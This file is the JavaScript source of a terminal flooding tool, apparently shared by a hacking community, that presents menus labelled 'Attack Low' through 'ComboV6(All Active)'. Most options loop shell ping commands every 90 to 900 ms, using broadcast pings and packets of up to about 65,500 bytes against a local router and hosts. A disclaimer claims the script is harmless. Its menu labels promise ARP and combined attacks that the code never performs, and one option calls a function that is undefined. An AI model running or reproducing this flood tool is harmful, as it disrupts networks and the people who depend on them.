/**
Powered by AnonDellX
Tag :
# XnetNotSepuh    │ # PaskoBlackHat
# AdellX          │ # XnetCommunity
# DemonEmperor    │ # KingdoomErorSystem404
# CnetLite        │ # Novra Sec Team
# XnetDelta       │ # StresserSec

Wajib baca!:
- Script ini aman dan tidak mengandung malware atau virus
- Script ini open source dan tidak di enc/obfuscate sehingga kalian dapat mwlihat isi code asli

-----------------------
*Dilarang Hapus Credit*
Rules :
$ Dilarang menjual script ini karena script ini bersifat gratis!
# Dilarang hapus Credit Dari Sumber Asli
# Dilarang Memakai script ini untuk berbuat Ilegal

Melanggar? akan tau resikonya!

apa yang diperbolehkan?
$ bebas rename asal tidak menghapus credit
$ Bebas Salin source code
$ boleh dipakai belajar nodejs

Library yang dipakai:
@child_process
@gradient-string
@path
@open
@readline
@url

*/
import readline from 'readline'
import { exec, spawn } from 'child_process'
import open from 'open'
import gradient from 'gradient-string'
import path from 'path';
import { URL } from 'url';

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});

async function start(){
  bersih();
  //await open('https://whatsapp.com/channel/0029VbB2NoMAInPmaprLrF3t');
  await logo();
  await nanya();
}
async function bersih(){
	spawn('clear',{stdio:'inherit'});
}
async function logo(){
  const teks = `

          ██████╗ ███╗   ██╗ ███████╗ ████████╗
         ██╔════╝ ████╗  ██║ ██╔════╝ ╚══██╔══╝
         ██║      ██╔██╗ ██║ █████╗      ██║
         ██║      ██║╚██╗██║ ██╔══╝      ██║
         ╚██████╗ ██║ ╚████║ ███████╗    ██║
          ╚═════╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝
               Powered By XnetCommunity
╭──────────────────────────┬─────────────────────────╮
│[~Cnet] Name  : CnetLite  │[?]> NodeJS              │
│[~Cnet] Versi : V33-Delta │[?]> ShellScript         │
│[~Cnet] Owner : AnonDellX │[?]> JavaScript          │
├──────────────────────────┼─────────────────────────┤
├───(AttackMenu)───────────┼─────────(ComboMenu)─────┤
│[1]> Attack Low           │[7]>  ComboV1(cast+icmp) │
│[2]> Attack Standar       │[8]>  ComboV2(cast+arp)  │
│[3]> Attack Medium        │[9]>  ComboV3(icmp+arp)  │
│[4]> Attack Hard          │[10]> ComboV4(allstorm)  │
│[5]> Attack DeltaNova     │[11]> ComboV5(extraCast) │
│[6]> Attack Xnets         │[12]> ComboV6(All Active)│
├──────────────────────────┼─────────────────────────┤
├───(Information)──────────┼─────────(ScannMyIp)─────┤
│[13]> My WhatsApp Channel │[16]> My Public Ip       │
│[14]> My Youtube Channel  │[17]> My Network Ip      │
│[15]> My Github           │[18]> Check Ip Website   │
├──────────────────────────┴─────────────────────────┘
│> Jalanin ulang  : npm start
│> Jalanin manual : node net.js
│> Stop Script    : Ctrl + C / Ctrl + z
│> Stop Node      : [44]
└─────────────────────────╮
                   ╭──────┴───────>`;
                          
  console.log(gradient(['red','blue','magenta','red'])(teks))
} const tess = `                   │Select a number:\n                   └>>> `
const log = console.log
let c = 0;
async function nanya(){
	rl.question(gradient(['blue','magenta'])(tess), (text) => {
		switch(text.toLowerCase()){
		  case '1':
           setInterval(()=>{
           	low();
           },2000);
		  break;
		  case '16':
		   spawn('node',['./plugin/myip.js'],{
		   	stdio:'inherit'
		   });
		   rl.close();
		   break
		  case '17':
		   spawn('bash',['./bash/wifi-ip.sh'],{
		    stdio:'inherit'
		   });
		   rl.close()
		  break;
		  case '18':
		   spawn('node',['./plugin/ipweb.js'],{
		   	stdio:"inherit"
		   });
		   rl.close();
		  break;
		  case '2':
		  setInterval(()=>{
		  	exec('ping -b -s 200 192.168.1.255');
		  	exec('ping -s 1000 192.168.1.250');
		  },900);
		  setInterval(()=>{
		  	console.log(gradient(['red','blue','magenta'])(`                   Attack Standar level > ${c}`));
		  	c++
		  },2000);
		  break;
		  case '3':
		  setInterval(()=>{
		  	exec('ping -b -s 10 192.168.1.255');
		  	exec('ping -s 10 192.168.1.250');
		  },700); setInterval(()=>{
		  	   console.log(gradient(['red','blue','magenta'])(`                   Attack Medium level > ${c}`));
		  	   c++
		  },2500)
		  break;
		  case '4':
		   setInterval(()=>{
		   	exec('ping -s 2000 192.168.1.1');
		   	exec('ping -s 5000 192.168.1.250');
		   	exec('ping -b -s 700 192.168.1.255');
		   	exec('ping -b 192.168.1.255');
		   },800);
		   setInterval(()=>{
		   	   console.log(gradient(['red','blue','magenta'])(`                   Attack Hard level > ${c}`));
		   	   c++
		   },3000);
		  break;
      case '44':{
    	rl.close();
      } break;
case '5':{
	setInterval(()=>{
		exec('ping -b -s 800 192.168.1.255');
		exec('ping -s 10000 192.168.1.250');
		exec('ping -s 20000 192.168.1.1');
	},500);
	setInterval(()=>{
	  console.log(gradient(['red','blue','magenta'])(`                   Attack DeltaNova level > ${c}`));
	  c++
	},2000)
}
break;
case '6':{
 setInterval(()=>{
	exec('ping -b -s 800 192.168.1.255');
	exec('ping -s 30000 192.168.1.250');
	exec('ping -s 20000 192.168.1.1');
 },400);

  setInterval(()=>{
 	console.log(gradient(['red','blue','magenta'])(`                   Attack Xnets level > ${c}`));
 	c++
  },2000);
} break;

case'13':{
	open('https://whatsapp.com/channel/0029VbB2NoMAInPmaprLrF3t');
	rl.close();
} break;
case '14':{
	open('https://www.youtube.com/@adeliana17-q6u');
	rl.close();
} break;
case '15':{
	open('https://github.com/NekomonHub');
	rl.close();
} break;
case '7':{
 setInterval(()=>{
    exec('ping -b -s 1000 192.168.1.255');
    exec('ping -s 20000 192.168.1.250');
    exec('ping -s 20000 192.168.1.1');
 },300);

  setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV1 has Attack > ${c}`));
    c++
  },2000);
} break;
case '8':{
 setInterval(()=>{
    exec('ping -b -s 1111 192.168.1.255');
    exec('ping -s 40000 192.168.1.250');
    exec('ping -s 9000 192.168.1.1');
 },200);                                                                                                                                                                                                    setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV2 has Attack > ${c}`));
    c++
  },2000);
} break;
case '9':{
 setInterval(()=>{
    exec('ping -b -s 1000 192.168.1.255');
    exec('ping -s 50000 192.168.1.250');
    exec('ping -s 50000 192.168.1.1');
 },100);                                                                                                                                                                                                    setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV3 has Attack > ${c}`));
    c++
  },2000);
} break;
case '10':{
 setInterval(()=>{
    exec('ping -b -s 1200 192.168.1.255');
    exec('ping -s 40000 192.168.1.250');
    exec('ping -s 40000 192.168.1.1');
 },90);                                                                                                                                                                                                    setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV4 has Attack > ${c}`));
    c++
  },2000);
} break;
case '11':{
 setInterval(()=>{
    exec('ping -b -s 1300 192.168.1.255');
    exec('ping -s 50000 192.168.1.250');
    exec('ping -s 50000 192.168.1.1');
 },600);                                                                                                                                                                                                    setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV5 has Attack > ${c}`));
    c++
  },2000);
} break;
case '12':{
 setInterval(()=>{
    exec('ping -b -s 13400 192.168.1.255');
    exec('ping -s 65503 192.168.1.250');
    exec('ping -s 65500 192.168.1.1');
 },900);                                                                                                                                                                                                    setInterval(()=>{
    console.log(gradient(['red','blue','magenta'])(`                   ComboV6 has Attack > ${c}`));
    c++
  },2000);
} break;
		  case '44': {
		    rl.close();
		  break;
		  }
		default:
	     log(gradient(['blue','magenta'])('    Options not available'));
		  rl.close();
		}
	});
} async function cr(){
  log(gradient(['blue','magenta'])('    Copyright by AdellX'));
} async function owner(){
  const teks = `
    --------( Owner Info )--------
    [&/owner]     : AdellX
    [&/Saluran]   : https://whatsapp.com/channel/0029VbB2NoMAInPmaprLrF3t
    [&/Group]     : -
    [&/Community] : XnetCommunity
    ------------------------------
    ------------------------------
  `;
	log(gradient(['red','magenta'])(teks));
} async function cast(){
  setInterval(() => {
  	exec('ping -b -s 1300 192.168.1.255');
  	exec('ping -s 65500 192.168.1.250');
  	exec('ping -s 65507 192.168.1.1');
  },400);
} 

start();
